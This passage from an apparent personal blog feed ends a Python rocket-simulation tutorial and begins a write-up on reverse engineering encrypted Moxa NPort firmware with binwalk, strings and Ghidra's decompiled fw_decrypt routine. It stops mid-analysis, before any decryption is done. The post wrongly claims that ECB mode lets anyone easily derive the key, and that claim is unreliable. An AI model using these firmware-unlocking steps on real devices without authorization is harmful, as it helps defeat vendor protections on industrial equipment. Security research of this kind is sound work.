</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>legend()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>grid()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>subplot(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>plot(time, velocity[:, <span style="color:#ae81ff">1</span>], label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Z Velocity&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>xlabel(<span style="color:#e6db74">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>ylabel(<span style="color:#e6db74">&#39;Z Velocity (m/s)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>title(<span style="color:#e6db74">&#39;Z Velocity Data&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>legend()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>grid()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>subplot(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>plot(time, acceleration[:, <span style="color:#ae81ff">1</span>], label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Z Acceleration&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>xlabel(<span style="color:#e6db74">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>ylabel(<span style="color:#e6db74">&#39;Z Acceleration (m/s^2)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>title(<span style="color:#e6db74">&#39;Z Acceleration Data&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>legend()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>grid()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>tight_layout()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>show()
</span></span></code></pre></div>
    <img src="/img/tvc-modeling/z-data-plot-1.png"  alt="Z data plots 1"  class="center"  style="padding: 10px"  />


<p>Look at those curves. We can see that our rocket can reach an altitude of around a bit over $100m$ with a maximum velocity of around $30m/s$. We can also see that initially, the rocket acceleration was around $-10m/s^2$. This is because the rocket was under the influence of gravity, so before the rocket is launched, it is always experiencing around $-9.81m/s^2$ of acceleration. And at around a few milliseconds after launch, the acceleration broke even with the gravitational pull, hitting $0m/s^2$, and a few milliseconds after that, it reached an acceleration of around $15m/s^2$, then the rocket enters the decay phase and the acceleration gradually dropped off.</p>
<p>Now, let&rsquo;s take a look at the data on the X axis:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># plot data (X axis)</span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>figure(figsize<span style="color:#f92672">=</span>(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">8</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>subplot(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>plot(time, pos[:, <span style="color:#ae81ff">0</span>], label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;X Position&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>xlabel(<span style="color:#e6db74">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>ylabel(<span style="color:#e6db74">&#39;X Position (m)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>title(<span style="color:#e6db74">&#39;X Position Data&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>legend()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>grid()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>subplot(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>plot(time, velocity[:, <span style="color:#ae81ff">0</span>], label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;X Velocity&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>xlabel(<span style="color:#e6db74">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>ylabel(<span style="color:#e6db74">&#39;X Velocity (m/s)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>title(<span style="color:#e6db74">&#39;X Velocity Data&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>legend()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>grid()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>subplot(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>plot(time, acceleration[:, <span style="color:#ae81ff">0</span>], label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;X Acceleration&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>xlabel(<span style="color:#e6db74">&#39;Time (s)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>ylabel(<span style="color:#e6db74">&#39;X Acceleration (m/s^2)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>title(<span style="color:#e6db74">&#39;X Acceleration Data&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>legend()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>grid()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>tight_layout()
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>show()
</span></span></code></pre></div>
    <img src="/img/tvc-modeling/x-data-plot-1.png"  alt="X data plots 1"  class="center"  style="padding: 10px"  />


<p>Recall when we were setting the parameters for the simulation, we set the <code>gimbal_angle</code> variable to $0rad$. This means the thruster won&rsquo;t move at all and the rocket will shoot straight up and won&rsquo;t move horizontally at all. That&rsquo;s why the data in the X axis is all 0 because nothing is happening in the X axis yet.</p>
<p>Let&rsquo;s try plotting out the trajectory of the rocket to get a better idea of how the rocket will fly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># plot trajectory of rocket (2D)</span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>figure(figsize<span style="color:#f92672">=</span>(<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>plot(pos[:, <span style="color:#ae81ff">0</span>], pos[:, <span style="color:#ae81ff">1</span>], label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Rocket Trajectory&#39;</span>, color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;blue&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>scatter(pos[<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>], pos[<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>], color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;green&#39;</span>, label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Launch Point&#39;</span>) <span style="color:#75715e"># mark the launch point</span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>scatter(pos[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>], pos[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>], color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;red&#39;</span>, label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Impact Point&#39;</span>) <span style="color:#75715e"># mark the impact point</span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>axhline(<span style="color:#ae81ff">0</span>, color<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;black&#39;</span>, linestyle<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;--&#39;</span>, label<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Ground&#39;</span>) <span style="color:#75715e"># ground level</span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>xlabel(<span style="color:#e6db74">&#39;X Position (m)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>ylabel(<span style="color:#e6db74">&#39;Z Position (m)&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>title(<span style="color:#e6db74">&#39;Rocket Trajectory&#39;</span>)
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>legend()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>plt<span style="color:#f92672">.</span>show()
</span></span></code></pre></div>
    <img src="/img/tvc-modeling/rocket-trajectory-1.png"  alt="Rocket trajectory plot 1"  class="center"  style="padding: 10px"  />


<p>The rocket just shoots straight up to an altitude of around a little bit over $100m$ then drop straight down to the ground.</p>
<h3 id="plotting-the-simulation-data-with-some-gimbal-angle">Plotting the simulation data with some gimbal angle</h3>
<p>Now let&rsquo;s see how our rocket will fly with some gimbal angle. To do this, we can just adjust our <code>gimbal_angle</code> variable. I&rsquo;ll adjust it by a tiny bit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>gimbal_angle <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0.05</span> <span style="color:#75715e"># radian</span>
</span></span></code></pre></div><p>And let&rsquo;s rerun the simulation.</p>
<ul>
<li>Z axis data:</li>
</ul>

    <img src="/img/tvc-modeling/z-data-plot-2.png"  alt="Z data plots 2"  class="center"  style="padding: 10px"  />


<ul>
<li>X axis data:</li>
</ul>

    <img src="/img/tvc-modeling/x-data-plot-2.png"  alt="X data plots 2"  class="center"  style="padding: 10px"  />


<p>So the data on the Z axis remains unchanged from the last time we run the simulation, but the data on the X axis changed a lot. We can see that the X position data is gradually moving towards a different position, this indicates that the rocket is actually moving in the X axis. We can see the velocity data is also decreasing to the negative range since we&rsquo;re moving to the left side. And we can also see the acceleration data on the X axis.</p>
<p>Let&rsquo;s see the flight trajectory:</p>

    <img src="/img/tvc-modeling/rocket-trajectory-2.png"  alt="Rocket trajectory plot 2"  class="center"  style="padding: 10px"  />


<p>And there we go. The rocket flies all the way over $100m$ and land at just over $30m$ from its initial launch point. We have successfully modeled a TVC rocket in Python.</p>
<h2 id="conclusion">Conclusion</h2>
<p>We have successfully modeled a TVC rocket in Python with 3 degrees of freedom. We&rsquo;ve covered what 3 degrees of freedom is, what thrust curve is, how to implement some equations to model the rocket and how to plot out the simulated rocket&rsquo;s data and trajectory.</p>
<p>There&rsquo;s a lot more to be done for this project like more realistic thrust curve, add in other external factors such as wind and air resistances, and implement a PID or a thrust vector control method to control this rocket. I might get around implementing these things into the simulation in the future.</p>
<p>This was a very fun project. I definitely learned a lot about rocketry from this, and I hope you can learn more about rocketry and rocket dynamics simulation from this blog post.</p>
<blockquote>
<p>You can check out the source code for this project <a href="https://github.com/namberino/tvc-sim">here</a></p></blockquote>
]]></content>
        </item>
        
        <item>
            <title>Decrypting a Serial-To-WiFi device&#39;s firmware</title>
            <link>https://namberino.github.io/posts/2024/04/decrypting-a-serial-to-wifi-devices-firmware/</link>
            <pubDate>Mon, 22 Apr 2024 14:40:02 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/04/decrypting-a-serial-to-wifi-devices-firmware/</guid>
            <description>&lt;p&gt;I&amp;rsquo;ve been doing some research into reverse engineering for a while now. I&amp;rsquo;ve also been learning about firmware and embedded systems for a long time. And I thought &amp;ldquo;Wouldn&amp;rsquo;t it be cool to combine these to skills to do something?&amp;rdquo;. So I decided to try decrypting the encrypted firmware of the a Serial-To-WiFi device. I&amp;rsquo;ve documented my process here in this blog post.&lt;/p&gt;
&lt;h2 id=&#34;the-device&#34;&gt;The device&lt;/h2&gt;
&lt;p&gt;I recently read that there was a vulnerability in the &lt;a href=&#34;https://www.moxa.com/en/products/industrial-edge-connectivity/serial-device-servers/wireless-device-servers/nport-w2150a-w2250a-series&#34;&gt;&lt;em&gt;Moxa NPort W2150A Serial-To-Wifi&lt;/em&gt;&lt;/a&gt; device that exploit stack-based buffer overflow. I decided I would take a shot at decrypting the firmware for this device, which was encrypted by default.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>I&rsquo;ve been doing some research into reverse engineering for a while now. I&rsquo;ve also been learning about firmware and embedded systems for a long time. And I thought &ldquo;Wouldn&rsquo;t it be cool to combine these to skills to do something?&rdquo;. So I decided to try decrypting the encrypted firmware of the a Serial-To-WiFi device. I&rsquo;ve documented my process here in this blog post.</p>
<h2 id="the-device">The device</h2>
<p>I recently read that there was a vulnerability in the <a href="https://www.moxa.com/en/products/industrial-edge-connectivity/serial-device-servers/wireless-device-servers/nport-w2150a-w2250a-series"><em>Moxa NPort W2150A Serial-To-Wifi</em></a> device that exploit stack-based buffer overflow. I decided I would take a shot at decrypting the firmware for this device, which was encrypted by default.</p>
<p>I decided to find an older version of the firmware an try to crack it. After looking through the internet, I found <a href="https://www.moxa.com/Moxa/media/PDIM/S100000210/moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom"><em>v2.2</em></a>. So I downloaded the firmware and got to decrypting.</p>
<h2 id="the-analysis">The analysis</h2>
<p>After reading the documentation and release note for the version 2.2 and older firmware versions, I found something interesting in the <a href="https://www.moxa.com/Moxa/media/PDIM/S100000210/W2250A%20Series_moxa-nport-w2150a-w2250a-series-firmware-1.11.rom_Software%20Release%20History.pdf">release note</a> of version <em>1.11</em>:</p>

    <img src="/img/nport-firmware/nport-firmware-version11-release-note.png"  alt="NPort firmware version 1.11 release note"  class="center"  style="padding: 10px"  />


<p>Version <em>1.11</em> is a requirement for upgrading to version <em>2.2</em>. This got me wondering if the encryption for the firmware was added with the v2.2 update. So I downloaded the <a href="https://www.moxa.com/Moxa/media/PDIM/S100000210/moxa-nport-w2150a-w2250a-series-firmware-1.11.rom">v1.11</a> release and start checking out the firmware.</p>
<p>I&rsquo;ll try to analyze these 2 versions. I&rsquo;ll use <code>binwalk</code> first. This tool allows me to walk through the entire binary and find file signatures and compression methods. The tool also provides extensive binary analysis features.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom
</span></span></code></pre></div><p>Running this <code>binwalk</code> command, <code>binwalk</code> can only find a <code>MySQL</code> file, which is most likely a false positive because I don&rsquo;t think a Serial-To-WiFi device would need to use a database. So we can&rsquo;t really extract any information from this.</p>
<p>Next, I tried <code>binwalk</code> on this version 1.11:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk moxa-nport-w2150a-w2250a-series-firmware-1.11.rom
</span></span></code></pre></div>
    <img src="/img/nport-firmware/nport-firmware-older-version-binwalk.png"  alt="NPort firmware version 1.11 binwalk"  class="center"  style="padding: 10px"  />


<p>And we can confirm that this firmware is not encrypted. There are 2 things that looks interesting here: The 2 <code>squashfs</code> filesystems compressed by <code>gzip</code>. <code>squashfs</code> is an entire Linux filesystem compressed.</p>
<p>Now that we know what is in the firmware, let&rsquo;s extract it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk -e moxa-nport-w2150a-w2250a-series-firmware-1.11.rom
</span></span></code></pre></div><p>This command will extract the <em>v1.11</em> firmware into the <code>_moxa-nport-w2150a-w2250a-series-firmware-1.11.rom.extracted</code> directory:</p>

    <img src="/img/nport-firmware/nport-firmware-extracted-screenshot.png"  alt="NPort firmware version 1.11 extracted"  class="center"  style="padding: 10px"  />


<p>There are some <code>squashfs-root</code> directories, which contains the firmware&rsquo;s Linux filesystem. Before we can access this, we need to give the directories correct permissions to be able to access it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chmod -R <span style="color:#ae81ff">770</span> squashfs-root*
</span></span></code></pre></div><p>Now we can access the <code>squashfs-root</code> directories. This looks like a <em>UNIX</em> filesystem:</p>

    <img src="/img/nport-firmware/nport-firmware-old-version-filesystem.png"  alt="NPort firmware version 1.11 extracted filesystem"  class="center"  style="padding: 10px"  />


<p>After searching through the directories, I stumbled across an interesting file in the <code>lib</code> directory of <code>squashfs-root-1</code>: <code>libupgradeFirmware.so</code>. Because we found out earlier that upgrading to <em>v2.2</em> requires us to have <em>v1.11</em>, I&rsquo;m guessing this <code>libupgradeFirmware.so</code> library will contain some information about how the firmware is encrypted. So let&rsquo;s analyze this binary.</p>
<h2 id="the-libupgradefirmwareso-reverse-engineering">The libupgradeFirmware.so reverse engineering</h2>
<p>I&rsquo;ll use <a href="https://ghidra-sre.org/"><code>Ghidra</code></a> as my decompiler of choice. It&rsquo;s open source and it&rsquo;s feature full.</p>
<p>Before we get into Ghidra, I&rsquo;ll run <code>strings</code> on the file to check for what functions we can find in here:</p>

    <img src="/img/nport-firmware/nport-firmware-strings.png"  alt="NPort firmware strings"  class="center"  style="padding: 10px"  />


<p>Already, we can see some interesting stuff just from that screenshot. We can see there are some AES functions, which means this binary uses <strong>AES</strong> block encryption algorithm. Let&rsquo;s run <code>grep</code> to see what other AES functions there are:</p>

    <img src="/img/nport-firmware/nport-firmware-strings-grep-aes.png"  alt="NPort firmware strings grep aes"  class="center"  style="padding: 10px"  />


<p>This is using AES in <strong>ECB</strong> mode (Electronic Code Block mode). Because <strong>ECB</strong> mode generates repeating ciphertext from repeating plaintext, it is easy for someone to derive the secret key and decrypt the encryption. So this represents a huge vulnerability, which we can exploit.</p>
<p>I also saw from the <code>strings</code> output that there&rsquo;s a couple of functions with the prefix <code>fw</code>. I&rsquo;m assuming it&rsquo;s a shorthand for firmware since from looking through the strings output, there&rsquo;s some operations like <em>write</em> and <em>decrypt</em>. I&rsquo;ll run <code>grep</code> on <code>fw</code> to see what other functions there are:</p>

    <img src="/img/nport-firmware/nport-firmware-strings-fw.png"  alt="NPort firmware Ghidra fw_decrypt function"  class="center"  style="padding: 10px"  />


<p>The <code>fw_decrypt</code> function is probably the firmware decrypt function, which means it&rsquo;s quite important in this firmware.</p>
<p>We&rsquo;ll open it up in Ghidra:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">fw_decrypt</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>param_1,uint <span style="color:#f92672">*</span>param_2,undefined4 param_3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined4 uVar1;
</span></span><span style="display:flex;"><span>  uint <span style="color:#f92672">*</span>puVar2;
</span></span><span style="display:flex;"><span>  byte <span style="color:#f92672">*</span>pbVar3;
</span></span><span style="display:flex;"><span>  uint decrypt_size;
</span></span><span style="display:flex;"><span>  uint uVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>__src;
</span></span><span style="display:flex;"><span>  uint <span style="color:#f92672">*</span>local_24;
</span></span><span style="display:flex;"><span>  undefined4 uStack_20;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  decrypt_size <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>param_2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (param_1 <span style="color:#f92672">==</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\x01&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((((decrypt_size <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x29</span>) <span style="color:#f92672">||</span> (decrypt_size <span style="color:#f92672">&lt;</span> (<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>        (decrypt_size <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>))) <span style="color:#f92672">||</span> ((decrypt_size <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x28</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffe</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>passwd<span style="color:#ae81ff">.3309</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> (pbVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">!=</span> ubuf) {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pbVar3 <span style="color:#f92672">^</span> <span style="color:#ae81ff">0xa7</span>;
</span></span><span style="display:flex;"><span>        pbVar3[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x8b</span>;
</span></span><span style="display:flex;"><span>        pbVar3[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x2d</span>;
</span></span><span style="display:flex;"><span>        pbVar3[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> pbVar3[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">^</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>        pbVar3 <span style="color:#f92672">=</span> pbVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      local_24 <span style="color:#f92672">=</span> param_2;
</span></span><span style="display:flex;"><span>      uStack_20 <span style="color:#f92672">=</span> param_3;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">ecb128Decrypt</span>((uchar <span style="color:#f92672">*</span>)param_1,(uchar <span style="color:#f92672">*</span>)param_1,decrypt_size,<span style="color:#f92672">&amp;</span>passwd<span style="color:#ae81ff">.3309</span>);
</span></span><span style="display:flex;"><span>      uVar4 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(uint <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (((<span style="color:#ae81ff">0x28</span> <span style="color:#f92672">&lt;</span> uVar4) <span style="color:#f92672">&amp;&amp;</span> ((<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">&lt;</span> uVar4)) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>         (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>)) {
</span></span><span style="display:flex;"><span>        __src <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> (uint)<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>local_24,__src,<span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>        puVar2 <span style="color:#f92672">=</span> (uint <span style="color:#f92672">*</span>)<span style="color:#a6e22e">cal_crc32</span>((<span style="color:#66d9ef">int</span>)__src <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>,uVar4 <span style="color:#f92672">+</span> (<span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>) <span style="color:#f92672">*</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>,
</span></span><span style="display:flex;"><span>                                   <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (puVar2 <span style="color:#f92672">==</span> local_24) {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">int</span>)decrypt_size <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">int</span>)uVar4) {
</span></span><span style="display:flex;"><span>            uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffb</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>param_2 <span style="color:#f92672">=</span> uVar4;
</span></span><span style="display:flex;"><span>            uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">goto</span> LAB_0001191c;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>LAB_0001191c:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CONCAT44</span>(param_1,uVar1);
</span></span><span style="display:flex;"><span>}
